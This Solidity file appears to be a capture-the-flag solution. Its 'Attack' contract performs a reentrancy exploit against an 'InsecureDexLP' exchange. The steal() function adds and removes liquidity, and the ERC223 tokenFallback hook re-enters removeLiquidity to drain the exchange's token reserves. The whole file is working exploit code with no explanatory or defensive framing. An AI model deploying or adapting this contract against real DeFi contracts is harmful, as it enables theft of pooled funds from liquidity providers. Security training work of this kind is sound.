// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./Challenge2.DEX.sol";

contract Attack {
    InsecureDexLP dex;
    IERC20 token0;
    IERC20 token1;
    bool stealing;

    constructor(address instance) {
        dex = InsecureDexLP(instance);

        token0 = IERC20(dex.token0());
        token1 = IERC20(dex.token1());

        token0.approve(instance, type(uint256).max);
        token1.approve(instance, type(uint256).max);
    }

    // Just a simple Reentrancy attack because of the use of the ERC223 token callback
    function steal() external {
        uint256 msgBal0 = token0.balanceOf(msg.sender);
        uint256 msgBal1 = token1.balanceOf(msg.sender);

        uint256 thisBal0 = token0.balanceOf(address(this));
        uint256 thisBal1 = token1.balanceOf(address(this));

        uint256 thisDexBal = dex.balanceOf(address(this));


        token0.transferFrom(msg.sender, address(this), msgBal0);
        token1.transferFrom(msg.sender, address(this), msgBal1);

        stealing = true;

        dex.addLiquidity(thisBal0, thisBal1);

        dex.removeLiquidity(thisDexBal);

        stealing = false;

        token0.transfer(msg.sender, thisBal0);
        token1.transfer(msg.sender, thisBal1);
    }

    function tokenFallback(address, uint256, bytes calldata) external {
        if (!stealing) {
            return;
        }

        uint256 amount = token0.balanceOf(address(dex));

        if (amount > 0) {
            uint256 dexBal = dex.balanceOf(address(this));
            dex.removeLiquidity(dexBal);
        }
    }
}